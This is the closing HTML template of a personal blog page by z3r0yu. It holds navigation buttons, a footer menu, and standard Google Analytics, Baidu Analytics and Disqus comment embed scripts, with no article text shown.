        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 z3r0yu
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-129276044-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'z3r0yu';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


